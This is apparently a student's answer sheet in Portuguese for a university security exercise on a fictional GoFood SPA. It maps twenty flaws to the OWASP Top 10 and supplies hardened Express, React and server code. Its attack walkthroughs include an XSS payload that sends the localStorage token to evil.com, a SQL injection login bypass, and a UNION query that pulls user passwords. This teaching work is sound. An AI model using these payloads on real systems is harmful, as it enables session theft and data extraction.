# Respostas — Exercício Prático: Segurança em SPA (GoFood)
**Engenharia de Sistemas Distribuídos — UFPB**  
**Aluno:** Leandeson Pinheiro Santos de Araújo  

---

## PARTE 1 — ANÁLISE

### Q1. Mapeamento OWASP Top 10 (Vulnerabilidades V1 a V20)

| Código | Descrição da Vulnerabilidade | OWASP Top 10 (2021) | Vetor de Ataque |
| :--- | :--- | :--- | :--- |
| **V1** | Secret do JWT *hardcoded* no código (`"gofood2024secret"`) | **A02:2021 – Cryptographic Failures** | Qualquer pessoa com acesso ao repositório pode extrair a chave e assinar tokens JWT falsos. |
| **V2** | Concatenação de variáveis na query SQL no login | **A03:2021 – Injection** | Injeção de SQL (ex: `' OR '1'='1' --`) para fazer *bypass* de autenticação. |
| **V3** | Token JWT sem tempo de expiração (`exp`) | **A07:2021 – Identification & Auth Failures** | Acesso perpétuo à conta caso o token seja interceptado. |
| **V4** | Exposição do papel (`role`) e ID no corpo da resposta HTTP | **A01:2021 – Broken Access Control** | O cliente recebe dados de controle que podem ser manipulados localmente. |
| **V5** | Token JWT lido diretamente do cabeçalho `Authorization` | **A07:2021 – Identification & Auth Failures** | O token precisa ser salvo no `localStorage`, ficando vulnerável a XSS. |
| **V6** | Concatenação de `req.params.id` diretamente na query SQL | **A03:2021 – Injection** | Extração de dados arbitrários do banco via parâmetros da URL. |
| **V7** | Ausência de verificação de propriedade do recurso em `/orders/:id` | **A01:2021 – Broken Access Control (IDOR)** | Permite visualizar pedidos de outros usuários alterando o ID na URL. |
| **V8** | Falta de validação e sanitização dos campos recebidos | **A04:2021 – Insecure Design** | Envio de objetos malformatados ou *payloads* maliciosos. |
| **V9** | Cálculo do preço total confiando nos valores enviados pelo cliente | **A04:2021 – Insecure Design** | O atacante altera o preço do produto antes de enviar o pedido. |
| **V10** | Rota `/admin/orders` sem verificação de perfil (*role check*) | **A01:2021 – Broken Access Control** | Qualquer usuário autenticado consegue listar todos os pedidos. |
| **V11** | Comunicação via HTTP sem cifragem | **A02:2021 – Cryptographic Failures** | Ataques *Man-in-the-Middle* para capturar credenciais em texto limpo. |
| **V12** | Armazenamento do token JWT no `localStorage` | **A01:2021 / A07:2021** | *Scripts* maliciosos (XSS) conseguem roubar a sessão facilmente. |
| **V13** | Armazenamento do perfil (`role`) no `localStorage` | **A01:2021 – Broken Access Control** | O usuário altera o valor para `admin` nas *DevTools* para burlar a UI. |
| **V14** | Decisão de renderização baseada no `localStorage` | **A01:2021 – Broken Access Control** | Exibe opções administrativas sem validação real no backend. |
| **V15** | Renderização com `dangerouslySetInnerHTML` sem sanitização | **A03:2021 – Injection (XSS)** | Injeção de código JavaScript malicioso executado no navegador. |
| **V16** | Permissão de CORS aberta para qualquer origem (`cors()`) | **A05:2021 – Security Misconfiguration** | Sites externos podem fazer requisições à API em nome do usuário logado. |
| **V17** | Leitor de JSON sem limite de tamanho de *payload* | **A05:2021 – Security Misconfiguration** | Ataque de DoS por esgotamento de memória ao enviar JSONs gigantes. |
| **V18** | Ausência de limitação de taxa de requisições (*Rate Limiting*) | **A07:2021 – Identification & Auth Failures** | Permite ataques de Força Bruta ilimitados no login. |
| **V19** | Ausência de cabeçalhos de segurança HTTP (falta de `helmet`) | **A05:2021 – Security Misconfiguration** | Exposição a ataques de *clickjacking* e ausência de CSP. |
| **V20** | Manipulador de erros global retornando a pilha de chamadas | **A05:2021 – Security Misconfiguration** | Atacantes mapeiam a estrutura do servidor forçando erros (*Information Disclosure*). |

---

### Q2. Ataque Prático: Roubo de Token via XSS

* **a) Passo a Passo da Execução:**
  1. O atacante envia um comentário contendo: `<img src="x" onerror="fetch('[https://evil.com/steal?t='+localStorage.getItem('token](https://evil.com/steal?t='+localStorage.getItem('token)'))">`.
  2. O servidor armazena o comentário sem sanitização.
  3. Quando outro usuário acessa a página, o React injeta o HTML no DOM via `dangerouslySetInnerHTML`.
  4. O navegador falha ao carregar a imagem `"x"`, disparando o evento `onerror`.
  5. O código malicioso lê o token do `localStorage` e envia para o servidor do atacante.

* **b) Execução em `/admin/orders`:**
  A exploração funcionará porque a rota possui a vulnerabilidade **V10** (falta de verificação de `role`). O backend valida apenas a autenticidade do JWT. Como o token roubado é válido, o servidor devolve a lista completa.

* **c) Mitigação com Cookie `HttpOnly`:**
  Se o token estivesse num cookie `HttpOnly`, o JavaScript (incluindo o script XSS) não teria acesso a ele via `document.cookie`, inviabilizando o roubo.

---

### Q3. Ataque Prático: SQL Injection

* **a) Injeção no Login:**
  * **Payload:** `' OR '1'='1' --`
  * **Mecanismo:** A condição `'1'='1'` é sempre verdadeira e `--` comenta o resto da instrução, logando o atacante como o primeiro usuário do banco (geralmente o admin).

* **b) Extração via UNION-Based SQLi:**
  * **Requisição:** `/orders/1 UNION SELECT id, email, password, role, NULL, NULL FROM users`
  * **Mecanismo:** A falha **V6** permite combinar a query legítima com a extração de dados confidenciais da tabela `users`.

* **c) Relação com o Secret Hardcoded (V1):**
  Com o *secret* exposto, o atacante não precisa explorar falhas no banco. Ele pode gerar tokens JWT válidos localmente com privilégios de administrador.

---

## PARTE 2 — CÓDIGO CORRIGIDO

### Q4. Backend Seguro: Autenticação (`auth.js`)
*Mitiga V1, V2, V3, V4 e V5.*

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const db = require('../db');
const router = express.Router();

const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Dados obrigatórios.' });

    const { rows } = await db.query('SELECT id, email, password, role FROM users WHERE email = $1', [email]);
    const user = rows[0];

    if (!user || !(await bcrypt.compare(password, user.password))) {
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }

    const accessToken = jwt.sign({ userId: user.id, role: user.role }, ACCESS_SECRET, { expiresIn: '15m' });
    const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, { expiresIn: '7d' });

    res.cookie('accessToken', accessToken, {
      httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'strict', maxAge: 900000
    });
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'strict', path: '/api/refresh', maxAge: 604800000
    });

    res.json({ success: true, message: 'Autenticado' });
  } catch (err) {
    res.status(500).json({ error: 'Erro interno' });
  }
});

router.post('/refresh', async (req, res) => {
  const refreshToken = req.cookies?.refreshToken;
  if (!refreshToken) return res.status(401).json({ error: 'Token ausente' });

  try {
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
    const { rows } = await db.query('SELECT id, role FROM users WHERE id = $1', [decoded.userId]);
    const user = rows[0];

    if (!user) return res.status(401).json({ error: 'Usuário não encontrado' });

    const newAccessToken = jwt.sign({ userId: user.id, role: user.role }, ACCESS_SECRET, { expiresIn: '15m' });
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'strict', maxAge: 900000
    });
    res.json({ success: true });
  } catch (err) {
    res.status(401).json({ error: 'Token inválido' });
  }
});

function authMiddleware(req, res, next) {
  const token = req.cookies?.accessToken;
  if (!token) return res.status(401).json({ error: 'Acesso negado' });

  try {
    req.user = jwt.verify(token, ACCESS_SECRET);
    next();
  } catch (err) {
    res.status(401).json({ error: 'Token inválido' });
  }
}

module.exports = { router, authMiddleware };
```

### Q5. Backend Seguro: Pedidos (`orders.js`)
*Mitiga V6, V7, V8, V9 e V10.*

```javascript
const express = require('express');
const { z } = require('zod');
const db = require('../db');
const { authMiddleware } = require('./auth');
const router = express.Router();

const orderSchema = z.object({
  items: z.array(z.object({ productId: z.number().int().positive(), qty: z.number().int().positive() })).min(1),
  address: z.string().min(5).max(255)
});

function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) return res.status(403).json({ error: 'Acesso negado' });
    next();
  };
}

router.get('/orders/:id', authMiddleware, async (req, res) => {
  try {
    const orderId = parseInt(req.params.id, 10);
    if (isNaN(orderId)) return res.status(400).json({ error: 'ID inválido' });

    const { rows } = await db.query('SELECT * FROM orders WHERE id = $1', [orderId]);
    const order = rows[0];

    if (!order) return res.status(404).json({ error: 'Pedido não encontrado' });
    if (order.user_id !== req.user.userId && req.user.role !== 'admin') return res.status(403).json({ error: 'Acesso negado' });

    res.json(order);
  } catch (err) { res.status(500).json({ error: 'Erro no servidor' }); }
});

router.post('/orders', authMiddleware, async (req, res) => {
  try {
    const { items, address } = orderSchema.parse(req.body);
    const productIds = items.map(i => i.productId);
    
    const { rows: products } = await db.query('SELECT id, price FROM products WHERE id = ANY($1)', [productIds]);
    let total = 0;
    const itemDetails = [];

    for (const item of items) {
      const product = products.find(p => p.id === item.productId);
      if (!product) return res.status(400).json({ error: 'Produto inválido' });
      total += product.price * item.qty;
      itemDetails.push({ productId: product.id, price: product.price, qty: item.qty });
    }

    await db.query('INSERT INTO orders (user_id, items, total, address) VALUES ($1, $2, $3, $4)', [req.user.userId, JSON.stringify(itemDetails), total, address]);
    res.status(201).json({ success: true, total });
  } catch (err) {
    res.status(err instanceof z.ZodError ? 400 : 500).json({ error: 'Erro ao processar' });
  }
});

router.get('/admin/orders', authMiddleware, requireRole('admin'), async (req, res) => {
  const { rows } = await db.query('SELECT * FROM orders');
  res.json(rows);
});

module.exports = router;
```

### Q6. Frontend Seguro: SPA (`App.jsx`)
*Mitiga V11, V12, V13, V14 e V15.*

```jsx
import React, { useState, useEffect } from 'react';
import DOMPurify from 'dompurify';

const API_URL = 'https://api.gofood.com/api'; 

function App() {
  const [isAdmin, setIsAdmin] = useState(false);

  async function checkAdminAccess() {
    try {
      const res = await fetch(`${API_URL}/me`, { method: 'GET', credentials: 'include' });
      setIsAdmin(res.ok ? (await res.json()).role === 'admin' : false);
    } catch { setIsAdmin(false); }
  }

  useEffect(() => { checkAdminAccess(); }, []);

  return <div>{isAdmin && <AdminPanel/>}</div>;
}

function AdminPanel() { return <div>Painel Admin</div>; }

function ProductComments({ comments }) {
  return (
    <div>
      {comments.map((c) => (
        <div key={c.id} dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.text) }} />
      ))}
    </div>
  );
}

export default App;
```

### Q7. Configuração Segura (`server.js`)
*Mitiga V16, V17, V18, V19 e V20.*

```javascript
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');

const app = express();

app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: ["'self'"] } } }));
app.use(cors({ origin: 'https://gofood.com', credentials: true }));
app.use(cookieParser());
app.use(express.json({ limit: '16kb' }));

app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
app.use('/api/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));

app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: process.env.NODE_ENV === 'production' ? 'Erro interno.' : err.message });
});

app.listen(3000);
```

---

## PARTE 3 — ANÁLISE ARQUITETURAL E ESCALABILIDADE

### Q8. Fluxo Completo Seguro

```text
+-----+             +-------------+               +-------------+             +----------+
| SPA |             | API Gateway |               | Auth/Orders |             | Database |
+-----+             +-------------+               +-------------+             +----------+
   | --- POST /login (HTTPS) -->| --- SELECT user ($1) ------>| --- Query ------------->|
   | <--- Set-Cookie (HttpOnly)-| <--- Valida hash & assina --| <--- Record ------------|
   |                            |                             |                         |
   | --- GET /orders/5 -------->| --- Verifica JWT ---------->| --- SELECT order ($1) ->|
   |     (Envia Cookie JWT)     |                             | --- Valida Ownership -->|
   | <--- Retorna Pedido -------| <--- Retorna JSON ----------| <--- Record ------------|
```

### Q9. Escalando a Segurança

* **a) Dados em Repouso:** **Tokenização**. Transfere o armazenamento de cartões para gateways externos (ex: Stripe), guardando apenas tokens sem valor no banco da GoFood.
* **b) Rede Interna:** **mTLS no Service Mesh**. O tráfego externo termina no Gateway, e a comunicação entre microserviços (Auth, Orders) ocorre via mTLS criptografado.
* **c) Observabilidade:** Monitorar **erros 403 (IDOR)** (V7, V10), **falhas de assinatura JWT** (V1), e **limitações de taxa (429)** no login (V18).

### Q10. DevSecOps Pipeline

| Etapa | Ferramenta | O que Detecta / Vulnerabilidades Mitigadas |
| :--- | :--- | :--- |
| **Pre-commit** | Trufflehog | **V1** (Secrets hardcoded bloqueados antes do commit). |
| **Build** | Snyk | Falhas em dependências (A06 OWASP). |
| **Test (SAST)** | SonarQube | **V2, V6, V15, V20** (SQLi, XSS e erros no código-fonte). |
| **Deploy (DAST)** | OWASP ZAP | **V10, V16, V19** (Falhas de rota, CORS e cabeçalhos em runtime). |
| **Runtime** | WAF (Datadog) | **V18** (Bloqueio de anomalias e *Brute Force* em produção). |
